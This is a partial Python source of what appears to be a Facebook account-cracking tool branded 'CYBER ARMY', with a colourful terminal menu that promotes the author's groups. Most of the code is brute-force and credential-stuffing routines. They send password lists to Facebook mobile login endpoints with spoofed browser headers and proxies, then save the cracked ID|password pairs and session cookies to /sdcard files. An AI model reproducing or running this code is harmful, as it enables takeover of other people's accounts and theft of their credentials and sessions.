...
def banner():
    #os.system('clear')
    print(f"""   \033[32;1m _______     ______  ______ _____  
  / ____\ \   / /  _ \|  ____|  __ \ 
 | |     \ \_/ /| |_) | |__  | |__) |
 | |      \   / |  _ <|  __| |  _  / 
 | |____   | |  | |_) | |____| | \ \ 
  ...
  \033[91;1m  ╔════════════════════════════════════════╗
   {H} ║{P}[{H}•{P}] Author    :{warna} CYBER ARMY                {N}{H}║
  {H}  ║{P}[{H}•{P}] Facebook  : {H}CYBER ARMY           {N}{H}║
    {H}║{P}[{H}•{P}] Whatsapp  : {M}+880191#***#64          {N}{H}║
  {H}  ║{P}[{H}•{P}] Github    : {K}github.com/cyberarmy0033{N}    {H}  ║
  {H}  ║{P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     ║
   {H} ║{P}[{H}•{P}] Network   : {H}3G{N}, {H}4G/5G{N}, {H}ON{N}     {H}      ║
   {H} ║{P}[{H}•{P}] Version   : {H}trial                    ║
   {H} ║{P}[{H}•{P}] Tools     : {H}ULTRA GREEN             ║
   {M} ╚════════════════════════════════════════╝ {P}""")
    print(f"""{GREEN}    SELL DONE{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}       {H} please review my group 
 {K}[{H}√{K}]{P} Successfully Update Done {H}trial """);print(led)
...
def mainx():
    ...
    print(f"{K} [{H}3{K}] {WHITE}File   Cloning-BEST ")
    ...
    print(f'{K} [{H}8{K}] {N}Contract SAIF ')
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/cyberarmy0033");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://facebook.com/groups/412641030225365/");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-KING {P}Terminal ');os.system("xdg-open https://www.facebook.com/Cyber.Army00");time.sleep(3);os.system('xdg-open https://www.facebook.com/groups/fb.king.cyber/?ref=share');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/Cyber.Army00");mainx()
def mainx2():
    os.system("clear")
    banner()
...
def dupcutter():
    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/CYBER.txt');print(led)
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mCYBER","\x1b[1;92mCYBER","\x1b[1;93mCYBER","\x1b[1;94mCYBER","\x1b[1;95mCYBER","\x1b[1;96mCYBER","\x1b[1;97mCYBER","\x1b[1;91mCYBER","\x1b[1;92mCYBER","\x1b[1;93mCYBER","\x1b[1;94mCYBER","\x1b[1;95mCYBER","\x1b[1;96mCYBER"])
    ...
    for pw in pwv: 
        try:
           ...
           'referer': f'https://p.facebook.com/reg/?cid=103&refid=8',
           'user-agent': pro,
           ...
           'x-requested-with': 'p.facebook.com',
           'x-xss-protection': '0',
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;33mCYBER-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/CYBER-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H}CYBER-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/CYBER-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
 ...
 # gif = random.choice(["\x1b[1;91m•    ","\x1b[1;92m••   ","\x1b[1;93m•••  ","\x1b[1;94m•••• ","\x1b[1;95m•••••"])
  ...
  for pw in pwv:
    try:
      ...
      ses.headers.update({"Host": "p.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/CYBER-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
...
def f1(idf,pwv):
  ...
  for pw in pwv:
    try:
      ...
      koki+=' m_pixel_ratio=2.625; wd=412x756'
      heade={
      'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Linux"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
      po = ses.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [CYBER-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/CYBER-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mCYBER-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/CYBER-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
...
def m5(idf,pw):
 ...
 try:
  for ps in pw:
   ...
   log_cookiessession.cookies.get_dict().keys()
   if 'c_user' in log_cookies:
    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
    user = re.findall('c_user=(.*);xs', coki)[0]
    print('\r\033[1;32m [CYBER-OK] '+user+'|'+ps) #+'--'+coki)
